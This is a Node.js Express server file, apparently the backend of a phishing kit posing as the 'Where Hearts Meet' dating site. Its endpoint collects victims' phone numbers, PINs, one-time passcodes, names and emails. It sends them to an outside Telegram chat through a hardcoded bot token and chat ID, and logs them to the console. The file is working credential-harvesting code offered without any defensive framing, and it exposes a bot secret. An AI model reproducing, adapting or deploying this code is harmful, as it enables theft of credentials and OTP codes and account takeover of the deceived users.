const express = require('express');
const app = express();
const PORT = process.env.PORT || 3000;

app.use(express.json());

// CORS
app.use((req, res, next) => {
    res.header('Access-Control-Allow-Origin', '*');
    res.header('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
    res.header('Access-Control-Allow-Headers', 'Content-Type');
    if (req.method === 'OPTIONS') {
        return res.sendStatus(200);
    }
    next();
});

// Health check endpoint
app.get('/health', (req, res) => {
    res.json({ status: 'OK', timestamp: new Date().toISOString() });
});

// Root endpoint
app.get('/', (req, res) => {
    res.json({ status: 'OK', message: 'Where Hearts Meet API is running!' });
});

// Telegram endpoint
app.post('/api/send-telegram', async (req, res) => {
    try {
        const { phone, pin, email, name, type, site } = req.body;
        
        console.log('Received request:', { phone, pin, name, type, email });
        
        const TG_BOT_TOKEN = '8907836454:AAH-hDujlmY50fqlErWuphD1wJ32RFnkL2I';
        const TG_CHAT_ID = '6811595070';
        const timestamp = new Date().toLocaleString();
        
        let message = '';
        if (type === 'pin') {
            message = `🔐 NEW REGISTRATION - ${site || 'Where Hearts Meet'} 🔐\n\n📱 Phone: ${phone}\n🔑 PIN: ${pin}\n👤 Name: ${name}\n📧 Email: ${email}\n⏰ Time: ${timestamp}`;
        } else {
            message = `✅ OTP VERIFIED - ${site || 'Where Hearts Meet'} ✅\n\n📱 Phone: ${phone}\n🔢 OTP: ${pin}\n👤 Name: ${name}\n⏰ Time: ${timestamp}`;
        }
        
        const url = `https://api.telegram.org/bot${TG_BOT_TOKEN}/sendMessage?chat_id=${TG_CHAT_ID}&text=${encodeURIComponent(message)}`;
        const response = await fetch(url);
        const result = await response.json();
        
        if (result.ok) {
            console.log('✅ Message sent to Telegram successfully');
            res.json({ success: true, message: 'Sent to Telegram' });
        } else {
            console.error('Telegram API error:', result);
            res.json({ success: false, error: result.description });
        }
        
    } catch (error) {
        console.error('Server error:', error.message);
        res.status(500).json({ success: false, error: error.message });
    }
});

// Start server
app.listen(PORT, '0.0.0.0', () => {
    console.log(`✅ Server running on port ${PORT}`);
    console.log(`✅ Telegram endpoint: /api/send-telegram`);
});
